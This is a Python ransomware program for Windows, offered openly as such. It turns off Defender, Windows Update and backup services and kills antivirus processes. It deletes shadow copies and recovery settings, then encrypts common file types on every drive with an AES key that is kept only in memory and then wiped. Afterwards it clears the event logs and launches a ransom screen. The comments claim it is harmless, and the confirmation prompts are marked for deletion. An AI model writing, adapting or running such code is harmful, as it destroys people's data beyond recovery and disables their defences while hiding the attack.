import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor
import subprocess
import mmap
import ctypes
import requests
import sys
import winreg
import win32api

# This ransomware was NEVER designed to cause harm, a kill switch similar to wannacry is implemented
def initial_check_kill():
    connect_counter = 0
    
    while connect_counter < 3:
        try:
            response = requests.get("http://Hd8heufhfeLSOjOoj33994fh3n2012ndu.com")
            if response.status_code == 200:
                if "win" in sys.platform.lower():
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    try:
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                        winreg.DeleteValue(key, "SystemUpdateService")
                        winreg.CloseKey(key)
                    except:
                        pass
                kill_ransomware_file()
                sys.exit()
            else:
                connect_counter += 1
        except requests.ConnectionError:
            connect_counter += 1

# Malware gets deleted from users file
def kill_ransomware_file():
    ransomware_file = os.path.abspath(__file__)
    try:
        os.remove(ransomware_file)
    except:
        sys.exit()

# A simple spreading mechanisim, disabled by default
def spread(spread=False):
    # To be implemented
    pass

# Start up commands for CMD and Powershell to attempt to disable security services
def startup_commands_windows():
    win_commands = [
        "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
        "net stop WinDefend",
        "sc config WinDefend start= disabled",
        "net stop wuauserv",
        "sc config wuauserv start= disabled",
        "net stop bits",
        "sc config bits start= disabled",
        "net stop wscsvc",
        "sc config wscsvc start= disabled",
        "powershell -Command \"vssadmin delete shadows /all /quiet\"",
        "bcdedit /set {default} recoveryenabled No",
        "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
        "wbadmin delete catalog -quiet", 
        "taskkill /f /im MsMpEng.exe",
        "taskkill /f /im Sophos*",
        "taskkill /f /im McAfee*"
    ]
    
    for command in win_commands:
        result = subprocess.run(command, capture_output=True, shell=True, text=True)
        if result.returncode != 0: 
            pass

# Attempt to clear event logs after attack
def attempt_rem_event_logs():
    win_commands = [
        "wevtutil cl System",
        "wevtutil cl Security",
        "wevtutil cl Application"
    ]
    
    for command in win_commands:
        result = subprocess.run(command, capture_output=True, shell=True, text=True)
        if result.returncode != 0: 
            pass

# Gather all drives used inside system
def gather_all_drives():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    
    if len(drives) == 0:
        sys.exit()
        
    return drives

# Launch ransom screen (as .exe format)
def launch_gui():
    path = os.path.join(os.getcwd(), "Screen.exe")
    subprocess.Popen([path])

# Generate temporary AES symetric key
def generate_key():
    return get_random_bytes(32)

# Encyrpt and corrupt file chosen
def encrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as file:
            file_content = file.read()   
            
        cipher = AES.new(key, AES.MODE_CBC)
        iv = cipher.iv
        encrypted_data = iv + cipher.encrypt(pad(file_content, AES.block_size))
        
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
            
        rename_file_with_counter(file_path, '.krypt')
    except PermissionError:
        try:
            rename_file_with_counter(file_path, '.krypt') # Just rename
        except PermissionError:
            pass
    except OSError:
        pass

# Rename file extension with KRYTPOS tag
def rename_file_with_counter(file_path, new_extension):
    base = os.path.splitext(file_path)[0]
    new_filename = base + new_extension
    file_counter = 1

    try:
        os.rename(file_path, new_filename)
    except FileExistsError:
        while True:
            new_filename_with_counter = f"{base}({file_counter}){new_extension}"
            if not os.path.isfile(new_filename_with_counter):
                os.rename(file_path, new_filename_with_counter)
                break
            file_counter += 1

def list_drives():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    
    if len(drives) == 0:
        sys.exit()
    
    return drives

def traverse_encrypt(drive, key):
    extensions = ('.doc', '.docx', '.pdf', '.txt', '.odt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif', '.mp3', '.wav', '.mp4', '.avi', '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv')
    
    for root, _, files in os.walk(drive):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                encrypt_file(os.path.join(root, file), key)

def parallel_search(drives, key):
    with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
        futures = [executor.submit(traverse_encrypt, drive, key) for drive in drives]
        for future in futures:
            future.result()

def zero_memory(buffer):
    length = len(buffer)
    # First pass: write all ones (0xFF)
    for i in range(length):
        buffer[i] = 0xFF
    # Second pass: write all zeros (0x00)
    for i in range(length):
        buffer[i] = 0x00

def key_to_ram(key):
    # Create an anonymous mmap for the key and write the key into it
    key_len = len(key)
    mm = mmap.mmap(-1, key_len, access=mmap.ACCESS_WRITE)
    mm.write(key)

    # Lock the memory to prevent swapping
    kernel32 = ctypes.windll.kernel32
    kernel32.VirtualLock(ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(mm))), ctypes.c_size_t(key_len))

    return mm, key_len, kernel32

def zero_and_unlock(mm, key_len, kernel_memory):
    # Zero out the memory after use
    zero_memory(mm)

    # Unlock the memory and close mmap
    kernel_memory.VirtualUnlock(ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(mm))), ctypes.c_size_t(key_len))
    mm.close()

def main():
    initial_check_kill()
    startup_commands_windows()
    
    key = generate_key()
    mm, key_len, kernel_memory = key_to_ram(key)
    drives = list_drives()
    parallel_search(drives, mm[:key_len])
    zero_and_unlock(mm, key_len, kernel_memory)
    
    attempt_rem_event_logs()
    launch_gui()

if __name__ == "__main__":
    input("ARE YOU SURE YOU WANT TO LAUNCH? THIS WILL CAUSE YOUR DEVICE SEVERE HARM!!! -> Final Warning") # will delete when project is finished
    input("Press any key again to confirm, this is to prevent accidental execution on main machine") # will delete when project is finished
    main()
